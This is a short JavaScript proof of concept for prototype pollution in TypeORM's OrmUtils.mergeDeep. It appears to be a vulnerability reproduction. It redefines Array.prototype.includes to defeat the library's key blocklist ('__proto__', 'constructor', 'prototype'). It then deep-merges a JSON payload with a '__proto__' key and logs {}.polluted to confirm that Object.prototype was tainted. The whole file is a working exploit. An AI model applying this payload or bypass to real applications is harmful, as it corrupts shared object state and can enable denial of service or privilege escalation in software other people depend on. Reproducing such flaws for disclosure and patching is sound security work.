Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
var typeorm = require('typeorm/util/OrmUtils');
const a = {};
const b = JSON.parse(`{"__proto__":{"polluted":"yes"}}`);
console.log({}.polluted);
typeorm.OrmUtils.mergeDeep(a, b);
console.log({}.polluted);